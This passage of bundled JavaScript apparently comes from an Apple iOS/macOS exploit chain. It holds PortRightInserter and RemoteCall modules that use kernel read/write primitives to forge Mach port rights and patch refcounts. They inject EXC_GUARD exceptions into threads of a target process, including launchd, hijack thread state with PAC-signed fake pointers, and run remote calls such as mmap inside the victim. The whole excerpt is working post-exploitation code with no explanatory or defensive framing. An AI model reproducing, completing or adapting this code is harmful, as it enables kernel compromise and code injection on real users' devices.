		//console.log(TAG, "New port addr: " + Utils.hex(pAddr));
		if (!pAddr)
			return 0;

		//this.#dumpPort(portKaddr);
		//this.#dumpPort(pAddr);

		const backupBits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(portKaddr);
		//console.log(TAG, "Port io bits: " + Utils.hex(backupBits));
		const needsFixBits = (backupBits & IO_BITS_KOLABEL);

		if (needsFixBits) {
			const newBits = backupBits & ~IO_BITS_KOLABEL;
			libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(portKaddr, newBits);
		}

		this.#fixRefCounts(portKaddr, 1);

		//console.log(TAG, "Fix Ok");
		//this.#dumpPort(portKaddr);

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(pAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipNsRequest, portKaddr);
		//this.#dumpPort(pAddr);

		let previous = this.#notifyNoSenders(p, MACH_PORT_NULL);
		//console.log(TAG, "Previous right: " + Utils.hex(previous));

		// Change the port rights from send once to send.
		this.#switchToSendRight(previous);

		//this.#fixRefCounts(portKaddr, -1, false);

		// We have a send right to the port, but it's not in our space's hash.
    	// We send the port, then kill the entry. We'll properly receive it afterwards.
		let msgBuff = new ArrayBuffer(40);
		let msgHeader = new _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"](msgBuff);
		msgHeader.msgh_id = 0x4141;
		msgHeader.msgh_remote_port = p;
		msgHeader.msgh_local_port = p;
		msgHeader.msgh_size = msgBuff.byteLength;
		msgHeader.msgh_bits = _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_3__["default"].MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, MACH_MSG_TYPE_MAKE_SEND);
		msgHeader.msgh_bits |= MACH_MSGH_BITS_COMPLEX;	// we send a port descriptor

		let msgBody = new DataView(msgBuff, 24);
		msgBody.setInt32(0, 1, true); 					// msgh_descriptor_count
		msgBody.setUint32(4, previous, true);			// name
		msgBody.setUint8(14, MACH_MSG_TYPE_COPY_SEND);	// disposition
		msgBody.setUint8(15, MACH_MSG_PORT_DESCRIPTOR);	// type

		//let wMsg64 = new BigUint64Array(msgBuff);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(wMsg64[i]).padStart(16, '0')}`);

		let msgMem = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(msgMem, msgBuff);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_SEND_MSG,
			msgBuff.byteLength, 0,
			p,
			0,
			0);
		//console.log(TAG, "mach_msg: " + ret);
		//Native.callSymbol("sleep", 1);
		if (ret != 0) {
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error sending message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg send: " + ret);

		this.#killRight(previous);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_msg",
			msgMem,
			MACH_RCV_MSG | MACH_RCV_TIMEOUT,
			0, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].memSize,
			p,
			1000,
			0);
		if (ret != 0)
		{
			let errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_error_string", ret);
			errString = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].readString(errString);
			console.log(TAG, `Error receiving message: ${errString}`);
			return 0;
		}

		//console.log(TAG, "mach_msg recv: " + ret);
		//Native.callSymbol("sleep", 1);

		let rMsg = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(msgMem, 40);

		//let rMsg64 = new BigUint64Array(rMsg);
		//for (let i=0; i<5; i++)
		//	console.log(TAG, `${i}: ${Utils.hex(rMsg64[i]).padStart(16, '0')}`);

		msgBody = new DataView(rMsg, 24);
		previous = msgBody.getUint32(4, true);
		//console.log(TAG, "previous: " + Utils.hex(previous));

		this.#fixRefCounts(portKaddr, -1);

		//this.#dumpPort(portKaddr);

		return previous;
	}

	static #newPort() {
		const options = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const buffer = new ArrayBuffer(8);
		const view = new DataView(buffer);
		view.setUint32(0, MPO_INSERT_SEND_RIGHT, true);
		view.setUint32(4, 0, true);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(options, buffer);
		const newPortPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem + 0x100n;
		let kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_construct", TASK_SELF, options, 0n, newPortPtr);
		if (kr != 0) {
			console.log(TAG, `Error creating port: ${kr}`);
			return MACH_PORT_NULL;
		}
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(newPortPtr);
	}

	static #switchToSendRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_SEND;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #killRight(port) {
		const entry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getRightAddr(BigInt(port));
		//console.log(TAG, "entry: " + Utils.hex(entry));
		//this.#dumpEntry(entry);
		let bits = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read32(entry + 0x8n);
		//console.log(TAG, "entry bits: " + Utils.hex(bits));
		bits = (bits & ~IE_BITS_TYPE_MASK) | MACH_PORT_TYPE_DEAD_NAME;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write64(entry, 0n);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].write32(entry + 0x8n, bits);
		//this.#dumpEntry(entry);
	}

	static #fixRefCounts(portAddr, diff, updateRefs=true, updateSonce=true) {
		// Due to krw limitation, we cannot write at offset +132 of a 144 bytes struct,
		// since krw would write in chunks of 32 bytes and so would cause a memory overflow (panic).
		// So we read all the 144 bytes struct, changes values and then write it again as a whole.

		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPort = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
		let ipcPortView = new DataView(ipcPort);

		let refs = ipcPortView.getUint32(0x4, true);
		let sonce = ipcPortView.getUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), true);

		//console.log(TAG, "refs: " + refs);
		//console.log(TAG, "sonce: " + sonce);

		refs += diff;
		sonce += diff;

		if (updateRefs) {
			//console.log(TAG, "new refs: " + refs);
			ipcPortView.setUint32(0x4, refs, true);
		}
		if (updateSonce) {
			//console.log(TAG, "new sonce: " + sonce);
			ipcPortView.setUint32(Number(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().ipSorights), sonce, true);
		}

		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, ipcPort);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].writeZoneElement(portAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 144);
	}

	static #notifyNoSenders(port, notifyPort) {
		const MACH_NOTIFY_NO_SENDERS = 0o106;
		
		const previousPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem;
		const kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_port_request_notification",
			TASK_SELF,
			port,
			MACH_NOTIFY_NO_SENDERS,
			0,
			notifyPort,
			MACH_MSG_TYPE_MAKE_SEND_ONCE,
			previousPtr);
		//console.log(TAG, "mach_port_request_notification: " + kr);
		if (kr != 0)
			return MACH_PORT_NULL;
		return libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read32(previousPtr);
	}

	static #dumpPort(pAddr) {
		console.log(TAG, "dump port: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(pAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(pAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 0x90);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<0x12; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}

	static #dumpEntry(entryAddr) {
		console.log(TAG, "dump entry: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(entryAddr));
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].read(entryAddr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].mem, 24);
		let buff64 = new BigUint64Array(buff);
		for (let i=0; i<3; i++)
			console.log(TAG, `${i}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_2__["default"].hex(buff64[i]).padStart(16, '0')}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/RegistersStruct.js":
/*!*********************************************!*\
  !*** ./src/libs/TaskRop/RegistersStruct.js ***!
  \*********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ RegistersStruct)
/* harmony export */ });
const TAG = "REGISTERSSTRUCT"

class RegistersStruct
{
	#dataView;

	constructor(buffer, offset = 0, length = 29) {
		this.#dataView = new DataView(buffer,offset, length * 8);
		this.length = length;
	}
    
	get(index) {
        if (index >= this.length || index < 0) {
            console.log(TAG,`Got wrong index in get:${index}`);
			return;
        }
        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian
    }

    set(index, value) {
        if (index >= this.length || index < 0) {
            console.log(TAG,`Got wrong index in set`);
			return;
        }
        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian
    }
}

/***/ }),

/***/ "./src/libs/TaskRop/RemoteCall.js":
/*!****************************************!*\
  !*** ./src/libs/TaskRop/RemoteCall.js ***!
  \****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ RemoteCall)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _Thread__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Thread */ "./src/libs/TaskRop/Thread.js");
/* harmony import */ var _Exception__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./Exception */ "./src/libs/TaskRop/Exception.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
/* harmony import */ var _PAC__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./PAC */ "./src/libs/TaskRop/PAC.js");
/* harmony import */ var _VM__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./VM */ "./src/libs/TaskRop/VM.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _PortRightInserter__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./PortRightInserter */ "./src/libs/TaskRop/PortRightInserter.js");


//import ExceptionThreadJS17 from '!raw-loader!./ExceptionThread17.js'
//import ExceptionThreadJS18 from '!raw-loader!./ExceptionThread18.js'

//import Offsets from "Driver/Offsets";

const TAG = "REMOTECALL"
const GUARD_TYPE_MACH_PORT = 0x1n;
const kGUARD_EXC_INVALID_RIGHT = BigInt(1 << 8);
const SWITCH_OPTION_NONE = 0n;
const fakePCTrojanCreator = 0x101n;
const fakeLRTrojanCreator = 0x201n;
const fakePCTrojan = 0x301n;
const fakeLRTrojan = 0x401n;
const __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK = 0xff000000n;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR = 0x2;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC = 0x4;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR = 0x8;
const SHMEM_CACHE_SIZE = 100;
const MAP_PRIVATE = 0x0002n;
const MAP_ANON = 0x1000n;

class RemoteCall
{
	#taskAddr;
	#creatingExtraThread;
	#firstExceptionPort;
	#secondExceptionPort;
	#firstExceptionPortAddr;
	#secondExceptionPortAddr;
	#dummyThread;
	#dummyThreadMach;
	#dummyThreadAddr;
	#dummyThreadTro;
	#selfThreadAddr;
	#selfThreadCtid;
	#trojanThreadAddr;
	#callThreadAddr;
	#originalState;
	#vmMap;
	#trojanMem;
	#localPort;
	#remotePort;
	#shmemCache = new Array(SHMEM_CACHE_SIZE);
	//#exceptionThreadCFString;
	#success = false;
	#threadList = [];
	#krwControlFd;
	#krwRwFd;
	#pid;

	constructor(param, migFilterBypass=null)
	{
		const peMark = (code, detail) => {
			try {
				if (typeof globalThis !== "undefined" && typeof globalThis.__pe_mark === "function")
					globalThis.__pe_mark(code, detail);
			} catch (_) {}
		};
		// launchd (pid 1 / name): prefer fewer EXC_GUARD targets — dual inject races KRW+mig and panics this DUT.
		let isLaunchd = (typeof param === "string" && param === "launchd") ||
			param === 1 || param === 1n || Number(param) === 1;
		let needInject = isLaunchd ? 1 : 2;

		if(typeof(param) == "string")
		{
			console.log(TAG,`Getting task by name: ${param}`);
			this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param);
		}
		else
		{
			console.log(TAG,`Getting task by pid: ${param}`);
			this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByPID(param);
			this.#pid = param;
		}

		if(!this.#taskAddr)
		{
			console.log(TAG,`Cannot get taskAddr, returning`);
			try { globalThis.__peRemoteFail = 0x491; } catch (_) {}
			return null;
		}
		peMark(0x34n);

		let firstExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
		let secondExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
	
		if (!firstExceptionPort || !secondExceptionPort)
		{
			console.log(TAG,`Couldn't create exception ports`);
			try { globalThis.__peRemoteFail = 0x492; } catch (_) {}
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, firstExceptionPort, 0n, 0n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, secondExceptionPort, 0n, 0n);
			return null;
		}
		// Make sure the task won't crash after we handle an exception
		_Task__WEBPACK_IMPORTED_MODULE_3__["default"].disableExcGuardKill(this.#taskAddr);
		peMark(0x35n);

		let guardCode = 0n;
		guardCode = this.#EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
		guardCode = this.#EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
		guardCode = this.#EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503n);
		let firstPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(firstExceptionPort);
		let secondPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(secondExceptionPort);

		let dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let dummyFunc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("getpid");
		
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
		dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
		let dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
		let dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(dummyThreadMach);
		let dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(dummyThreadAddr);
		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_thread_self"));
		let selfThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
		let selfThreadCtid = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getCtid(selfThreadAddr);
		
		this.#creatingExtraThread = true;
		this.#firstExceptionPort = firstExceptionPort;
		this.#secondExceptionPort = secondExceptionPort;
		this.#firstExceptionPortAddr = firstPortAddr;
		this.#secondExceptionPortAddr = secondPortAddr;
		this.#dummyThread = dummyThread;
		this.#dummyThreadMach = dummyThreadMach;
		this.#dummyThreadAddr = dummyThreadAddr;
		this.#dummyThreadTro = dummyThreadTro;
		this.#selfThreadAddr = selfThreadAddr;
		this.#selfThreadCtid = selfThreadCtid;
		let retryCount = 0;
		let validThreadCount = 0;
		let successThreadCount = 0;
		let firstThread = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
		let currThread = firstThread;
	
		this.#trojanThreadAddr = firstThread;

		peMark(0x36n);
		if (migFilterBypass)
			migFilterBypass.resume();

		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let gotFirstExc = false;

		// launchd: inject thread0 only. Dual-inject + re-arm AST reboots PID1 on sensitive DUTs.
		while ( true && successThreadCount < needInject && validThreadCount < 5 && retryCount < 3)
		{
			let task = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread);
			if (!task)
			{
				if (!validThreadCount)
				{
					console.log(TAG, `failed on getting first thread at all, resetting first thread and currThread`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else
					break;
			}
			if (task == this.#taskAddr)
			{
				if (!this.#setExceptionPortOnThread(this.#firstExceptionPort, currThread, migFilterBypass))
				{
					console.log(TAG, `Set exception port on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
					if (!validThreadCount)
					{
						console.log(TAG, `failed on first thread, resetting first thread and currThread`);
						firstThread = currThread = this.#retryFirstThread(migFilterBypass);
						retryCount++;
						continue;
					}
				}
				else
				{
					// Pause mig during raw KRW AST write — concurrent socket KRW with mig thread panics.
					if (migFilterBypass)
						migFilterBypass.pause();
					let injOk = false;
					try {
						injOk = !!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].injectGuardException(currThread, guardCode);
					} finally {
						if (migFilterBypass)
							migFilterBypass.resume();
					}
					if (!injOk)
					{
						console.log(TAG,`Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
						if (!validThreadCount)
						{
							console.log(TAG, `failed on first thread, resetting first thread and currThread`);
							firstThread = currThread = this.#retryFirstThread(migFilterBypass);
							retryCount++;
							continue;
						}
					}
					else
					{
						successThreadCount++;
						this.#threadList.push(currThread);
						console.log(TAG, `Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} OK`);
					}
				}
				validThreadCount++;
			}
			else if (task && !validThreadCount)
			{
				console.log(TAG,`Got weird tro on first thread, resetting first thread and currThread`);
				firstThread = currThread = this.#retryFirstThread(migFilterBypass);
				retryCount++;
				continue;
			}

			let next = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].next(currThread);
			if (!next)
			{
				if (!validThreadCount) {
					console.log(TAG, `Got empty next thread on first thread. Retry`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else {
					console.log(TAG, "Break because of empty next thread");
					break;
				}
			}
			currThread = next;
		}

		if (migFilterBypass)
			migFilterBypass.pause();

		console.log(TAG, `Valid threads: ${validThreadCount}`);
		console.log(TAG, `Injected threads: ${successThreadCount}`);

		if (!this.#threadList.length) {
			console.log(TAG, "Exception injection failed. Aborting.");
			try { globalThis.__peRemoteFail = 0x493; } catch (_) {}
			this.destroy();
			return null;
		}

		// Yield once so PID1 can run; do NOT re-arm AST on launchd (re-inject reboots).
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", 150000);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_switch", 0, 0, 0);
		} catch (_) {}

		if (isLaunchd) {
			const LAUNCHD_SLICE_MS = 3000;
			const LAUNCHD_SLICES = 20;
			console.log(TAG, `launchd: wait first EXC on thread0 (${LAUNCHD_SLICES}x${LAUNCHD_SLICE_MS}ms, no re-inject)`);
			for (let waitTry = 0; waitTry < LAUNCHD_SLICES; waitTry++) {
				try { peMark(0x37n, BigInt(waitTry + 1)); } catch (_) {}
				if (_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, LAUNCHD_SLICE_MS, false)) {
					gotFirstExc = true;
					console.log(TAG, `launchd EXC hit slice ${waitTry + 1}`);
					break;
				}
				try { libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("thread_switch", 0, 0, 0); } catch (_) {}
			}
		} else {
			peMark(0x37n);
			gotFirstExc = !!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort,excBuffer,120000,false);
		}
		if (!gotFirstExc)
		{
			console.log(TAG, `Failed to receive first exception`);
			try { globalThis.__peRemoteFail = 0x494; } catch (_) {}
			try {
				for (let i = 0; i < this.#threadList.length; i++)
					_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(this.#threadList[i]);
			} catch (_) {}
			this.destroy();
			return null;
		}
		peMark(0x38n);

		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		let originalStateBuff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64_SIZE);
		this.#originalState = new _ThreadState__WEBPACK_IMPORTED_MODULE_7__["default"](originalStateBuff);
		for(let i = 0; i < 29; i++)
		{
			this.#originalState.registers.set(i,exc.threadState.registers.get(i));
		}
		this.#originalState.opaque_fp = exc.threadState.opaque_fp;
		this.#originalState.opaque_lr = exc.threadState.opaque_lr;
		this.#originalState.opaque_sp = exc.threadState.opaque_sp;
		this.#originalState.opaque_pc = exc.threadState.opaque_pc;
		this.#originalState.cspr = exc.threadState.cspr;
		this.#originalState.opaque_flags = exc.threadState.opaque_flags;

		for(let i = 0; i < this.#threadList.length;i++)
		{
			_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(this.#threadList[i]);
		}
		console.log(TAG,`Finish clearing EXC_GUARD from all other threads...`);
		peMark(0x39n);
		// Launchd: never flush/reply stray exceptions — resumes unrelated PID1 threads and reboots.
		if (!isLaunchd) {
			let desiredTimeout = 1500;
			while (true)
			{
				let flushBuf = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
				if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, flushBuf, desiredTimeout, false))
					break;
				let flushed = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(flushBuf,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize)));
				_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(flushed, flushed.threadState,false);
			}
		}
		peMark(0x3An);
		if (this.#threadList.length)
			firstThread = this.#trojanThreadAddr = this.#threadList[0];
		try {
			_Task__WEBPACK_IMPORTED_MODULE_3__["default"].disableExcGuardKill(this.#taskAddr);
		} catch (_) {}
		let newState = exc.threadState;
		newState = this.#signState(firstThread, newState, fakePCTrojanCreator, fakeLRTrojanCreator);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		peMark(0x3Bn);

		let trojanMemTemp = (exc.threadState.opaque_sp & 0x7fffffffffn) - 0x100n;

		this.#vmMap = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getMap(this.#taskAddr);

		// launchd: skip second-thread promote. setExceptionPort TRO-swap + thread_resume on PID1 reboots.
		if (isLaunchd) {
			this.#creatingExtraThread = false;
			peMark(0x3Cn, 0x1n);
			console.log(TAG, `launchd: skip extra trojan thread — stay on temp RemoteCall`);
			this.#pid = this.#doRemoteCallTemp(100, "getpid");
			console.log(TAG, `Task pid: ${this.#pid}`);
			peMark(0x3Dn, BigInt(this.#pid || 0));
			if (Number(this.#pid) !== 1) {
				console.log(TAG, `launchd temp getpid unexpected: ${this.#pid}`);
				try { globalThis.__peRemoteFail = 0x495; } catch (_) {}
				this.destroy();
				return null;
			}
			peMark(0x3En, 0x1n);
			this.#trojanMem = this.#doRemoteCallTemp(1000, "mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
			peMark(0x3En, 0x2n);
			if (!this.#trojanMem || this.#trojanMem === 0n || this.#trojanMem === -1n || this.#trojanMem === 0xffffffffffffffffn) {
				console.log(TAG, `launchd temp mmap failed: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(this.#trojanMem)}`);
				try { globalThis.__peRemoteFail = 0x496; } catch (_) {}
				this.destroy();
				return null;
			}
			this.#doRemoteCallTemp(100, "memset", this.#trojanMem, 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);
			peMark(0x3En, 0x3n);
			this.#success = true;
			console.log(TAG, `Finished for now succesfully (launchd temp path)`);
			return;
		}

		let remoteCrashSigned = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, fakePCTrojan, 0n);

		let ret = this.#doRemoteCallTemp(100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
		
		let pthreadAddr = this.read64(BigInt(trojanMemTemp));
		
		let callThreadPort = this.#doRemoteCallTemp(100, "pthread_mach_thread_np", pthreadAddr);

		if (callThreadPort == 0n)
		{
			console.log(TAG,`Cannot find callThreadPort`);
			this.destroy();
			return null;
		}
		this.#callThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObjectOfTask(this.#taskAddr, BigInt(callThreadPort));

		if (migFilterBypass)
			migFilterBypass.resume();

		if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
		{
			console.log(TAG,`Failed to set new exception port on newly created thread, trying one more time before giving up, creating new thread`);
